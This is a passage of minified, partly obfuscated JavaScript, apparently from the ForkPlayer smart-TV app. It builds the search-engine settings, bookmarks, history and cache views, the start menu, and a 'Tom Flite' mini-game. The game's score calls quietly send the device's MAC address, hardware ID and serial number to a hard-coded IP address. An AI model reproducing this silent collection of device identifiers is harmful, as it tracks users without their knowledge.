запроса</div></div>","title":""+t.url,"presearch":"http://omnibox.spiderxml.com/?type=historysearch","description":tmpl_info.replace("info","Укажите URL c параметром %s вместо запроса"),"playlist_url":"payd_egsurl","value":t.url,"search_on":"URL c параметром %s вместо запроса","position":"html"},{"br":1,"before":"<div style='text-align: left; width:100%;'>","after":"</div>","title":"_FPUse in search_: "+dop,"value":enabled,"template":"<div style='margin-left: 30px;    text-align: left;    font-size: 30px;    float: left;  '>$title</div>$description","position":"html","description":"","playlist_url":"payd_egsenabled","menu":mn},{"br":1,"before":"<div style='margin:30px;'></div>","title":"Сохранить","template":tmpl_button,"playlist_url":"about:configsearch#save:"+x[1]+":"+x[2],"logo_30x30":"","position":"html"}]};return data}else if(x[0]=="setdefault"){delete se.search;setVars("start",se);se=getVars("start")}
setVars("start",se);data.defaultSelect=oldselect;se=se.search}else se=getVars("start").search;console.log(se);data["chan"+"nels"]=[];data.before="<div style='text-align:left;margin:3px 20px;'><b>Поисковая система по умолчанию </b><div style='text-align:left;font-size: 18px;'> Список формируется из вашей истории посещений сайтов с поисковыми формами и добавленных вручную</div></div>";data.align="left";var cX=0,cY=0;try{var typ="sites";for(var i=0;i<se[typ].length;i++){var mn=[{"title":"Использовать по умолчанию","playlist_url":"about:configsearch#setDop:sites:"+i+":2"},{"title":"Использовать дополнительно","playlist_url":"about:configsearch#setDop:sites:"+i+":1"},{"title":"Отключить ","playlist_url":"about:configsearch#setDop:sites:"+i+":0"},{"title":"Изменить","playlist_url":"about:configsearch#edit:"+typ+":"+i},{"title":"Передвинуть вверх","playlist_url":"about:configsearch#move:"+typ+":up:"+i},{"title":"Передвинуть вниз","playlist_url":"about:configsearch#move:"+typ+":down:"+i}];if(se[typ][i].dop==2)var dop="<span style='color:green;font-weight:bold;'>по умолчанию </span>";else if(se[typ][i].dop)dop="дополнительно";else{dop="<span style='color:red;'>отключено</span>"}
mn.push({"title":"Удалить","playlist_url":"about:configsearch#del"+typ+":"+i});data["chan"+"nels"].push({"logo_30x30":se[typ][i].logo,"position":"html","coordination":[cX,cY++],"title":se[typ][i].title,"playlist_url":"menu","menu":mn,"template":"<div style='text-align:left;margin:0px 30px;font-size:25px;float:left;width: 450px;   overflow: hidden;'><img src='$logo_30x30' onerror='this.style.visibility=\"hidden\";' style='height:20px;margin-top: 5px; margin-right: 5px;    float: left;' />"+"$title</div><div style='font-size:18px;margin-left:30px;float:left;width:150px;'>"+dop+"</div><div style='font-size:18px;margin-left:20px;float:left;width:60px;'>&nbsp;"+se[typ][i].type+"</div><div style='font-size:16px;color:#f2ebb6;margin-left:30px;float:left;    padding-top: 4px;    width: 450px;    overflow: hidden;    height: 20px;'>"+se[typ][i].url+"</div>","description":tmpl_info.replace("info",se[typ][i].url),"after":"<br>"})}
data["chan"+"nels"].push({"logo_30x30":"none","before":"<div style='margin: 50px;'>","title":"Добавить поисковик","position":"html","coordination":[cX++,cY],"template":tmpl_button,"playlist_url":"about:configsearch#edit:sites:new"});data["chan"+"nels"].push({"logo_30x30":"none","title":"Сбросить настройки поисковых систем","position":"html","coordination":[cX++,cY],"playlist_url":"confirm","confirm":["about:configsearch#setdefault"],"after":"</div>","template":tmpl_button});data["chan"+"nels"][data["chan"+"nels"].length-1].after+="<div style='font-size:18px;margin:30px;font-style: italic;'><span style='color:green;'>По умолчанию </span> - Это ваша поисковая система по умолчанию в адресной строке и на начальной странице.<br>"+"Дополнительно - поиск будет вестись также по этим сайтам Iframe - сайт ищет по нескольким вложенным в нем страницам (ифреймах) Site - одна страница с ответом на ваш запрос</div>"}catch(e){console.log(e);kjtYpr.popUp("Err listed searches:<br>"+e.message,2000)}}else if(n.indexOf("about:addstartlink")==0){if(n=="about:addstartlinkok"){if(gV(pq.input,"sturl")=="")kjtYpr.inf("Ссылка не может быть пустой!",1800);else{if(gV(pq.input,"sttitle")=="")var title=gV(pq.input,"sturl").match(/(.*\/\/)?(.{0,20})(\?)?/)[2];else title=gV(pq.input,"sttitle");favarray={"title":title,"playlist_url":pq.input.sturl};kjtYpr.l1Q1OIO0duul1l1IlYprPlay("cmdToStart");return gotoStart()}}
var data={"title":"Добавить ссылку","channels":[]};data.channels.push({"title":"Заголовок(не обязательно)"+(gV(pq.input,"sttitle")!=""?":"+gV(pq.input,"sttitle"):""),"value":gV(pq.input,"sttitle"),"playlist_url":"payd_sttitle","search_on":"Введите заголовок","logo_30x30":""});data.channels.push({"title":"URL ссылки"+(gV(pq.input,"sturl")!=""?":"+gV(pq.input,"sturl"):""),"value":gV(pq.input,"sturl"),"playlist_url":"payd_sturl","search_on":"Введите URL ссылки","logo_30x30":"","presearch":"http://omnibox.spiderxml.com/?type=all"});data.channels.push({"title":"Добавить","playlist_url":"about:addstartlinkok","logo_30x30":""});data.icon="none";data.typeList="list";data.navigate="Добавить новый сайт в Стартовое меню"}else if(n=="about:favorites"){s=kjtYpr.l1O0l1gmmv01O11Ypr("bookmarks");var dopch=[];if(s!=""){var sd=l0QO11lOz0bfh10l0Ypr(s);if(sd!=null){dopch=sd}}
var data={"playlist_name":"_FPZakladki_","channels":[]};for(var i=0;i<dopch.length;i++){if(typeof dopch[i].logo_30x30!="undefined")var logo=dopch[i].logo_30x30;else logo="https://raw.githubusercontent.com/komivp/appinfodl/main/static/zakl.png";data.channels.push({"title":dopch[i].title,"playlist_url":dopch[i].playlist_url,"logo_30x30":_img(logo)})}
data.channels.push({"title":"Добавить папку","playlist_url":"bookmarksadd","logo_30x30":""+_img("_ST_plus.png")});if(kjtYpr.l1O0l1gmmv01O11Ypr("zakladki.xml")!="")data.channels.push({"title":kjtYpr.GL["zakladki.xml"],"playlist_url":"zakladki.xml","logo_30x30":""+_img("https://raw.githubusercontent.com/komivp/appinfodl/main/static/zakl.png")});if(kjtYpr.l1O0l1gmmv01O11Ypr("zakladkiSerials.xml")!="")data.channels.push({"title":kjtYpr.GL["zakladkiSerials.xml"],"playlist_url":"zakladkiSerials.xml","logo_30x30":""+_img("https://raw.githubusercontent.com/komivp/appinfodl/main/static/zakl.png")});if(kjtYpr.l1O0l1gmmv01O11Ypr("zakladkiFilms.xml")!="")data.channels.push({"title":kjtYpr.GL["zakladkiFilms.xml"],"playlist_url":"zakladkiFilms.xml","logo_30x30":""+_img("https://raw.githubusercontent.com/komivp/appinfodl/main/static/zakl.png")});if(kjtYpr.l1O0l1gmmv01O11Ypr("zakladkiIPTV.xml")!="")data.channels.push({"title":kjtYpr.GL["zakladkiIPTV.xml"],"playlist_url":"zakladkiIPTV.xml","logo_30x30":""+_img("https://raw.githubusercontent.com/komivp/appinfodl/main/static/zakl.png")});data.channels.push({"title":"_FPMy_ _FPVneshnie_ _FPzakladki_ "+(user==null?"(Необходимо войти в аккаунт)":"("+user.login)+")","playlist_url":"http://cloudflare.appinfo.su/browseraccount/?do=list","logo_30x30":""+_img("https://raw.githubusercontent.com/komivp/appinfodl/main/static/zakl.png")});data.channels.push({"logo_30x30":_img("_ST_history.png"),"title":"История поисков","playlist_url":"about:histsearch","description":""});data.channels.push({"logo_30x30":_img("_ST_history.png"),"title":"История вводов URL","playlist_url":"about:histurl","description":""});data.channels.push({"logo_30x30":_img("_ST_history.png"),"title":"_FPIstoriya_ ("+kjtYpr.l1O0l1gmmv01O11Ypr("history").length+"bytes)","playlist_url":"about:history","description":"История последних просмотров и посещений на этом устройстве"});data.channels.push({"logo_30x30":_img("_ST_history.png"),"onclick":"autouserexport()","title":"История посещений моих устройств "+(user==null?"(Необходимо войти в аккаунт)":"("+user.login)+")","playlist_url":"http://cloudflare.appinfo.su/browseraccount/?do=history"});data.channels.push({"title":"Кеш / Сохраненные страницы ("+kjtYpr.l1O0l1gmmv01O11Ypr("prev_cache").length+"bytes)","playlist_url":"about:cache","logo_30x30":_img("_ST_fcache.png"),"description":"В кеш сохраняются страницы открытые со стартового меню или внутренних/внешних закладок. Эти страницы хранятся локально на вашем устройстве"})}else if(n.indexOf("about:histsearch")==0){data={"playlist_name":"История поисков","channels":[]};for(var a in enteresObj){var el=enteresObj[a];if(!el.n.match(/[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)?/gi))
data.channels.push({"title":el.n,"playlist_url":"http://spiderxml.com/search?search="+el.n,"logo_30x30":_img("_ST_history.png"),"description":"Нажмите для поиска в Spider"})}}else if(n.indexOf("about:histurl")==0){data={"playlist_name":"История ввода адресов","channels":[]};var x=kjtYpr.l1O0l1gmmv01O11Ypr("enteres").split("|");for(var a in enteresObj){var el=enteresObj[a];if(el.n.match(/[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)?/gi))
data.channels.push({"title":el.n,"playlist_url":el.n,"logo_30x30":_img("_ST_history.png"),"description":"Нажмите для перехода по адресу<br>"+el.n})}}else if(n.indexOf("about:cache")==0){data={"title":"Кеш","channels":[]};var x=l0QO11lOz0bfh10l0Ypr(kjtYpr.l1O0l1gmmv01O11Ypr("prev_cache"));if(n=="about:cache"){for(var a in x){var el=x[a];data.channels.push({"title":el.settitle,"playlist_url":"about:cache://"+a,"logo_30x30":el.setimg,"description":"Дата помещения в кеш: "+dt(el.setcache,!0)+"<br>Размер: "+llIl1I1HlMgNII1IO0Ypr(el).length+"bytes"})}}else{data=x[n.substr(14)]}}else if(n=="about:history"){s=kjtYpr.l1O0l1gmmv01O11Ypr("history");data=l0QO11lOz0bfh10l0Ypr(s);var d=[];if(data==null){d.push({"title":"_FPZdesPusto_"})}else for(var i=0;i<data.length;i++){var dpu=null;if(typeof data[i].ch=="object"){var ch=data[i].ch;ch.menu=[{"title":"Страница "+data[i].title,"playlist_url":data[i].xml_url,"logo_30x30":data[i].icon}];var mtc=data[i].ch.stream_url.match(/\/\/(.*?)\//);if(mtc!=null)dpu=mtc[1];ch.display_title=ch.title+" / "+data[i].title}else{ch={"display_title":data[i].title,"playlist_url":data[i].xml_url,"logo_30x30":data[i].icon}}
if(dpu==null){var mtc=data[i].xml_url.match(/\/\/(.*?)\//);if(mtc!=null)dpu=mtc[1]}
if(dpu!=null)dpu="<div style='float:right;margin-right: "+css_w(27)+"px;'>"+dpu+"</div>";else dpu="";ch.display_title=dt(data[i].time+(parseInt(kjtYpr.GL.JTVRegion)+T.offset/60)*3600,1,0,1,1)+dpu+" <span style='white-space:normal;'>"+ch.display_title+"</span>";ch.title=data[i].title;ch.description="";d.push(ch)}
data={"options":"hidedescription","cacheinfo":"nocache","playlist_name":"_FPIstoriya_","channels":d}}
if(n=="getconfig"){var def={"config":{"best":3,"order":startL},"fav":[]};var ch=l0QO11lOz0bfh10l0Ypr(kjtYpr.l1O0l1gmmv01O11Ypr("glstart"));if(ch==null){ch=def}
if(typeof ch.config=="undefined"||ch.config==null)ch.config=def.config;if(typeof ch.config.order=="undefined")ch.config.order=def.config.order;if(typeof ch.fav=="undefined")ch.fav=def.fav;if(typeof ch.search=="undefined"){ch.search={"sites":[]};ch.search.sites.push({"logo":"http://p.lnka.ru/icons/youtube.png","type":"site","title":"YouTube","dop":2,"url":"http://p.lnka.ru/http://youtube.com/?id=search&search=%s"})}
if(typeof ch.search.system!="undefined"){for(var i=0;i<ch.search.system.length;i++){el=ch.search.system[i];if(el!=null){el.type="iframe";ch.search.sites.push(el)}}
delete ch.search.system}
if(typeof ch.search.ds!="undefined"&&typeof ch.search.sites[ch.search.ds]!="undefined"){ch.search.sites[ch.search.ds].dop=2;delete ch.search.ds}
for(var i=0;i<ch.search.sites.length;i++){if(ch.search.sites[i]==null){ch.search.sites.splice(i,1);i--}else if(typeof ch.search.sites[i].type=="undefined")ch.search.sites[i].type="site"}
console.log(ch);return ch}
if(n=="start"||n=="about:blank"){var ch=getVars("getconfig");ch.service=[];if(kjtYpr.build>=5.5)ch.service.push({"source":"service","title":"Local Files & Plugins","tvg-shift":"1","logo_30x30":"_ST_usb.png","playlist_url":"http://remotefo.rk/treeview?host=remotefo.rk/","description":"http://127.0.0.1/treeview"});else if(kjtYpr.build>=5.1)ch.service.push({"source":"service","title":"Ace stream torrent plugins","logo_30x30":"_ST_ace_stream.png","playlist_url":"http://remotefo.rk/treeview?pluginacetorrentplay/.xml&host=remotefo.rk/","description":"forkplayer://pluginacetorrentplay/"});if(gV(kjtYpr.GL,"acestream")!=""||gV(kjtYpr.GL,"aceactive"))ch.service.push({"source":"service","title":"Ace stream torrent","logo_30x30":"_ST_ace_stream.png","local":2,"mb_parser":"http://ACE_IP:6878/webui/api/service?method=get_version&format=jsonp&callback=mycallback","menu_url":"1080|remotefork|rfs","playlist_url":"http://p.lnka.ru/torrentsites/?as=md5mbhash","description":"http://p.lnka.ru/torrentsites/"});if(kjtYpr.GL.remote>0){ch.service.push({"source":"service","title":"RemoteFork DLNA & Plugins","logo_30x30":"_ST_dlna.png","playlist_url":"forkdlna","description":"forkplayer://RemoteFork/"});ch.service.push({"source":"service","title":"Home media server","tvg-shift":"1","logo_30x30":"_ST_hms.png","playlist_url":"hms","description":"forkplayer://HMS/"})}
if(is_tizen)ch.service.push({"source":"service","title":"USB","tvg-shift":"1","logo_30x30":"_ST_usb.png","playlist_url":"usb://","description":"forkplayer://USB/"});else if(platform=="sams"){ch.service.push({"source":"service","title":"USB<br>_FPPamyatTv_","tvg-shift":"1","logo_30x30":"_ST_usb.png","playlist_url":"usb://","description":"forkplayer://USB/"});ch.service.push({"source":"service","title":"ForkStore<br> App Market","tvg-shift":"1","logo_30x30":"_ST_fstore.png","playlist_url":"http://obovse.ru/smarttv/wlist.php","description":"http://forkplayer.tv/forkstore"})}
ch.service=delDupl(ch.fav,ch.service);if(typeof ch.hidetop=="object"){for(var i=0;i<ch.service.length;i++)if(ch.hidetop[gV(ch.service[i],"playlist_url")+""+gV(ch.service[i],"stream_url")]){ch.service.splice(i,1);i--}}
ch.omnibox=[];var k=getDefaultSE();if(!k.allse.length){var ot="_FPEnter_ URL _FPor Add search engine in settings_";var logo="none"}else if(k.allse.length==1){ot="_FPEnter URL or search on_ "+k.allse[0]+" _FPor Add search engine in settings_";logo=k.logo}else{logo="";ot="_FPEnter URL or search on_ "+k.allse.join(", ")+""}
ch.omnibox.push({"source":"spider","title":ot,"position":"fulleditline","value":"","search_on":"_FPEnter search query or URL_:","logo_30x30":logo,"playlist_url":"searchEngines","description":"search engine","presearch":"http://omnibox.spiderxml.com/?type=all"});ch.spider=[];ch.spider.push({"source":"spider","title":"_FPAdd a search engine_","position":"html","template":tmpl_box2,"logo_30x30":_img("_ST_auto_fix.png"),"playlist_url":"about:configsearch#edit:sites:new"});ch.spider.push({"source":"spider","title":"_FPRecover my account data_","position":"html","logo_30x30":"_ST_search.png","playlist_url":"http://cloudflare.appinfo.su/browseraccount/","template":tmpl_box3});ch.spider.push({"source":"spider","title":"_FPMy bookmarks and history_","position":"html","logo_30x30":_img("_ST_1px.png"),"playlist_url":"about:favorites","template":tmpl_box3});ch.spider.push({"source":"spider","title":"_FPVisit third party site_ spiderxml","position":"html","logo_30x30":"_ST_search.png","playlist_url":"http://spiderxml.com/","template":tmpl_box3});ch.spider.push({"source":"spider","title":"_FPGo to settings_","position":"html","logo_30x30":_img("_ST_1px.png"),"playlist_url":"about:settings","template":tmpl_box3});ch.spider.push({"source":"spider","title":"_FPHide this_ _FPBeginner_","position":"html","playlist_url":"confirm","description":"_FPHide from the start page hints_ _FPBeginner_? _FPYou can turn it back on in the settings_","confirm":["about:settings#setconfig:setsearch:0"],"template":tmpl_box3});ch.top=getTop(ch);console.log(ch);ch.channels=[];$.each(ch.config.order,function(i,val){var kk=0;$.each(ch[val],function(i2,val2){if(val2!=null){val2.id=i2;if(i2==0){kk=0;val2.br=1;val2.before=gV(startT,val)}else kk++;if(kk==9){val2.br=1;kk=0}
val2.source=val;ch.channels.push(val2)}});kk=0;if(val=="fav"){val2={"source":"addfav","title":"<b>_FPAdd shortcut_</b>","logo_30x30":_img("_ST_round_plus.png"),"playlist_url":"about:addstartlink"};if(ch.fav.length==0){kk=0;val2.br=1;val2.before=gV(startT,val)}else kk++;if(kk==9){val2.br=1;kk=0}
ch.channels.push(val2)}});ch.title="_FPDobroPozhalovat_";ch.icon="none";ch.align="left";ch.typeList="start";ch.css="#content{width: 95%;margin-left: 5%;}";ch.navigate="_FPStartovoeMenu_";for(var i=0;i<ch.channels.length;i++){for(var j in ch.channels[i]){if(gV(ch[i],j)=="undefined")ch.channels[i][j]=""}}
console.log(ch);data=ch}
return data}
function OeInit(f,n){var b=Inset.create();b.init(n);return b}
function getFon(u){if(u=="")u=_img("_ST_fon/fon20.jpg");else if(u=="jpg"||u=="png"){u=addident("http://cloudflare.appinfo.su/browseraccount/?do=fon&ext="+u)}
return u}
var curPage=FXMLPage.create();function wheel(c){return oInset[insetActive].wheel(c)}
function capitalizeFirstLetter(string){return string.charAt(0).toUpperCase()+string.slice(1)}
function readSet(){kjtYpr.GL=l0QO11lOz0bfh10l0Ypr(kjtYpr.l1O0l1gmmv01O11Ypr("settings"));console.log(kjtYpr.l1O0l1gmmv01O11Ypr("settings"));if(kjtYpr.GL==null){kjtYpr.defaulted=1;kjtYpr.setDefault()}
for(var i in DS)if(gV(kjtYpr.GL,i)=="")kjtYpr.GL[i]=DS[i];llQOIO10IiuQlOl0Ypr=l0QO11lOz0bfh10l0Ypr(kjtYpr.l1O0l1gmmv01O11Ypr("storage"));if(llQOIO10IiuQlOl0Ypr==null)llQOIO10IiuQlOl0Ypr={};uHelper.create("directnoheader").updateCurl()}
readSet();if((kjtYpr.l1O0l1gmmv01O11YprC("ts")=="1"||kjtYpr.l1O0l1gmmv01O11Ypr("ts")=="1"||uaJ=="mag")){var TS=1}else{TS=0}
function cleanCh(ch){var obj={};for(var key in ch){if(gV(ch,key)!=""&&key.toString().match(/^(title|logo|stream_url|playlist_url|search_on|parser)/)){if(ch[key]!=""){obj.search_on="";obj[key]=ch[key]}}}
return obj}
function reverseString(str){return str.toString().split("").reverse().join("")}
function gP(k){if(Ill1110()==null)return null;else if(k!=null){if(gP()!=null)return gP()[k]}else return Ill1110().page}
function IlIOIO(k){if(Ill1110()==null)return null;else if(k!=null){if(IlIOIO()!=null)return IlIOIO()[k]}else return Ill1110().loadPage}
function Ill1110(k){if(k!=null){if(Ill1110()!=null)return Ill1110()[k]}else return oInset[insetActive]}
function rgba(s){if(kjtYpr.GL.pr<=0||kjtYpr.GL.pr==100||box_low2){try{var m=s.match(/\((.*),/)[1].split(",");return"#"+hex(m[0])+hex(m[1])+hex(m[2])}catch(e){console.log(e)}}
return s}
var hexDigits=new Array("0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f");function hex(x){return isNaN(x)?"00":hexDigits[(x-x%16)/16]+hexDigits[x%16]}
function onImgError(t,m){t.onerror=null;if(m==null||m=="err"){t.src=icoerr}else if(m=="emptydoc"){t.src=_img("_ST_emptydoc.png")}else if(m=="ico_edit"){t.src=ico_edit}}
try{document.addEventListener('visibilitychange',function(){if(document.hidden){console.log("visible off")}else{console.log("visible on");uHelper.create("direct").updateCurl();l0OI10IRge011lO1Ypr();updateWeather()}},!0);window.addEventListener("resize",function(event){getwh()})}catch(e){console.log(e)}
addHandler(window,'DOMMouseScroll',wheel);addHandler(window,'mousewheel',wheel,{passive:!1});var tomflight_init=!1;function tomflight(){tscreen="game";console.log("start tomflight");if(!tomflight_init){var div=document.createElement('div');div.id="game";div.style.top="0px";div.style.left="0px";div.style.width="1280px";div.style.height="720px";div.style.overflow="hidden";div.style.display="none";div.style.padding="0px";div.style.backgroundColor="black";div.style.position="absolute";div.style.zIndex="0";div.onclick=tomflight_click;$_("main").appendChild(div);tomflight_init=!0}
$_("game").style.display="block";$_("game").style.zIndex="1";lI1I1IxFCIh1l01llYpr("game","<div style='padding:0px 20px;height:30px;width:1240px;'><div id='gfps' style='position:absolute;left:200px;'></div><div id='gallrel' style='position:absolute;left:450px;'></div><div id='gtop' style='float:left;'></div><div id='gfirst' style='float:right;'></div></div>"+"<div id='gmain' style='height:690px;width:1280px;'></div>"+"<div id='gbottom'></div>");tomflight_start()}
var tomflight_f=!1,tomflight_i,tomflight_fi,tomflight_c,t_x=0,t_c=0,t_t=0,t_arr=[],t_xnum=0,t_rec=0,t_fps=0,fps=0,t_glrek="";var glevel=1,gwidth=16000,ltx=0,mv=0;function tomflight_start(){t_x=0;t_c=250;t_xnum=0;t_t=0;t_fps=0;fps=0;ltx=0;mv=0;glevel=1;var s=kjtYpr.l1O0l1gmmv01O11Ypr("rt");if(s!=""&&!isNaN(s))t_rec=s;else t_rec=0;t_arr=[],tomflight_f=!1;clearInterval(tomflight_i);clearInterval(tomflight_fi);if(t_glrek!=""){var s=t_glrek.split("<br>");lI1I1IxFCIh1l01llYpr("gallrel",s[1]+":"+s[0].split(":")[1])}else{lIl0l1OX1vbll1I1IQYpr("http://85.17.30.89/obovse.ru/smarttv/api.php?do=tomflight&fps=0&n=0&initial="+box_client+"|"+kjtYpr.mac+"|"+kjtYpr.hardware+"|"+kjtYpr.serial,"tomflight")}
lI1I1IxFCIh1l01llYpr("gfirst","Рекорд: "+t_rec);lI1I1IxFCIh1l01llYpr("gmain","<div id='gtowers' style=\"position:absolute;top:30px;left:"+t_x+"px;height:100%;width:"+gwidth+"px;background:url(https://raw.githubusercontent.com/komivp/appinfodl/main/static/tomflight/tomflight_fon.jpg);\"></div>"+"<div id='gcat' style='position:absolute;top:"+t_c+"px;left:150px;height:48px;width:64px;background-color:gray;background:url(https://raw.githubusercontent.com/komivp/appinfodl/main/static/tomflight/tom.png);'></div>");tomflight_tower(t_x);tomflight_i=setInterval("tomflight_render();",40);tomflight_fi=setInterval(function(){if(tomflight_f){clearInterval(tomflight_fi);return}
fps=(t_fps/2).toFixed(1);mv=-1*((t_x-ltx)/2).toFixed(1);t_fps=0;ltx=t_x;lI1I1IxFCIh1l01llYpr("gfps","FPS: "+fps)},2000)}
function tomflight_render(){if(tomflight_f||handler=="vk")return;var ind=1;if(fps>2&&t_x<-150&&mv>15){if(fps>2)ind=24/fps;else ind=24/3}
ind=ind+((glevel-1)/10)*ind;t_x-=Math.ceil(7*ind);t_t++;t_fps++;t_c+=Math.ceil(1+(t_t/3.5))*ind;if(t_x*-1>gwidth){tomflight_tower();glevel++;t_x=0;kjtYpr.popUp("Уровень: "+glevel)}
$_("gcat").style.top=t_c+"px";$_("gtowers").style.left=t_x+"px";tomflight_isset()}
function tomflight_down(){if(tomflight_f)return;t_c+=75;$_("gcat").style.backgroundPosition="0px 48px";$_("gcat").style.top=t_c+"px";setTimeout('$_("gcat").style.backgroundPosition="0px 0px";',120);tomflight_isset()}
function tomflight_click(m,k,n){if(tomflight_f)return;if(n==null){t_c-=55;$_("gcat").style.backgroundPosition="0px 96px";n=0;clearTimeout(tomflight_c)}else t_c-=10;t_t=0;$_("gcat").style.top=t_c+"px";if(n<2)tomflight_c=setTimeout("tomflight_click(null,null,"+(n+1)+");",30);else setTimeout('$_("gcat").style.backgroundPosition="0px 0px";',100);tomflight_isset()}
function tomflight_tower(x){var s="",i=2,l=0,ls=0,dm=120;t_arr=[];while(l+400<gwidth){var r=Math.ceil(80+340*Math.random());if(ls>0){if(ls-r>dm)r=ls-dm;else if(r-ls>dm)r=ls+dm}
var l=i*400;t_arr.push([l,r]);s+="<div style='position:absolute;top:0px;left:"+l+"px;height:"+r+"px;width:130px;background:url(https://raw.githubusercontent.com/komivp/appinfodl/main/static/tomflight/tomfligh_t_down.png);background-position:0px "+r+"px;'></div>"+"<div style='position:absolute;top:"+(r+150)+"px;left:"+l+"px;height:"+(690-r-150)+"px;width:130px;background:url(https://raw.githubusercontent.com/komivp/appinfodl/main/static/tomflight/tomfligh_t_up.png);'></div>";i++;ls=r}
lI1I1IxFCIh1l01llYpr("gtowers",s)}
var last=-1;function tomflight_isset(){var s="";var x=150-t_x;for(var i=0;i<t_arr.length;i++){if(x+62>t_arr[i][0]&&x<130+t_arr[i][0]){if(x>t_arr[i][0]+60){t_xnum=(glevel-1)*t_arr.length+i+1}
s=" INTO "+t_c+" "+t_arr[i][1];if(t_c-27<t_arr[i][1]||t_c>t_arr[i][1]+140){s=" INTO FAIL "+t_c+" "+t_arr[i][1];tomflight_fail()}}}
if(t_c>800&&!tomflight_f)tomflight_fail();if(last!=t_xnum)lI1I1IxFCIh1l01llYpr("gtop","Счет: "+t_xnum);last=t_xnum}
function tomflight_fail(){if(tomflight_f)return;tomflight_f=!0;clearInterval(tomflight_fi);clearInterval(tomflight_i);clearTimeout(tomflight_c);setTimeout(function(){if(t_xnum>0){lIl0l1OX1vbll1I1IQYpr("http://85.17.30.89/obovse.ru/smarttv/api.php?do=tomflight&fps="+fps+"&n="+t_xnum+"&initial="+box_client+"|"+kjtYpr.mac+"|"+kjtYpr.hardware+"|"+kjtYpr.serial,"tomflight")}
if(t_xnum>t_rec){t_rec=t_xnum;kjtYpr.lll0Il11OxICbl1ll0Ypr("rt",t_xnum);s="";confirmed.create("Новый рекорд!<br>Счет: "+t_xnum+"<br>","Tom Flite","_FPZakrit_|_FPNachatZanovo_")}else confirmed.create("Вы проиграли<br>Счет: "+t_xnum+"<br>Рекорд: "+t_rec,"Tom Flite","_FPZakrit_|_FPNachatZanovo_");confirmed.fun0=function(){tscreen="main";$_("game").style.display="none";$_("game").style.zIndex="0"};confirmed.fun1=function(){tomflight_start()}},1000)}
var jwplayer=null;var low_filter=0;try{}catch(e){jwplayer={}}
var low_filter=1